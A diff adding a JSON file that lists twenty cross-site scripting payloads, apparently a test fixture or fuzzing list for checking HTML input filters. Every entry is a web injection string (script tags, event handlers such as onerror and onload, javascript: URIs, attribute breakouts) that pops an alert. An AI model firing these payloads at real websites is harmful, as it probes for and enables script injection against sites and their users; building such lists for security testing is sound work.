@@ -1,0 +1,82 @@
+[
+    {
+        "id": 1,
+        "payload": "<script>alert(1)</script>"
+    },
+    {
+        "id": 2,
+        "payload": "<img src=x onerror=alert(1)>"
+    },
+    {
+        "id": 3,
+        "payload": "<svg onload=alert(1)>"
+    },
+    {
+        "id": 4,
+        "payload": "<body onload=alert(1)>"
+    },
+    {
+        "id": 5,
+        "payload": "<iframe src=\"javascript:alert(1)\">"
+    },
+    {
+        "id": 6,
+        "payload": "<a href=\"javascript:alert(1)\">click</a>"
+    },
+    {
+        "id": 7,
+        "payload": "<input onfocus=alert(1) autofocus>"
+    },
+    {
+        "id": 8,
+        "payload": "<details open ontoggle=alert(1)>"
+    },
+    {
+        "id": 9,
+        "payload": "<marquee onstart=alert(1)>"
+    },
+    {
+        "id": 10,
+        "payload": "\"><script>alert(1)</script>"
+    },
+    {
+        "id": 11,
+        "payload": "' onmouseover=alert(1) '"
+    },
+    {
+        "id": 12,
+        "payload": "<x onclick=\"alert(1)\">click</x>"
+    },
+    {
+        "id": 13,
+        "payload": "<div style=\"background:url('javascript:alert(1)')\">"
+    },
+    {
+        "id": 14,
+        "payload": "<object data=\"javascript:alert(1)\">"
+    },
+    {
+        "id": 15,
+        "payload": "<embed src=\"data:text/html,<script>alert(1)</script>\">"
+    },
+    {
+        "id": 16,
+        "payload": "<form action=\"javascript:alert(1)\"><input type=submit>"
+    },
+    {
+        "id": 17,
+        "payload": "<isindex action=\"javascript:alert(1)\" type=image>"
+    },
+    {
+        "id": 18,
+        "payload": "<xss style=\"background:url('javascript:alert(1)')\">"
+    },
+    {
+        "id": 19,
+        "payload": "<math><brute href=\"javascript:alert(1)\">click</brute></math>"
+    },
+    {
+        "id": 20,
+        "payload": "<video><source onerror=\"javascript:alert(1)\">"
+    }
+]
